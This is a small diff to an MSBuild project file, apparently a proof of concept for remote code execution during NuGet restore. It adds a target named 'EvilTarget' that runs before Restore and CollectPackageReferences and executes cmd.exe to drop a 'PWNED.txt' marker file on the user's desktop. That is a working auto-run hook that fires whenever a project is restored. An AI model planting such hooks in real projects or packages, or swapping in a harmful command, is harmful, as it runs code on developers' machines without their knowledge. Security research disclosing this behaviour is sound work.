@@ -1,5 +1,5 @@
 <Project>
   <Target Name="EvilTarget" BeforeTargets="Restore;CollectPackageReferences">
-    <Exec Command="mspaint.exe" />
+    <Exec Command="cmd.exe /c echo NuGet RCE PoC > %USERPROFILE%\Desktop\PWNED.txt" />
   </Target>
 </Project>
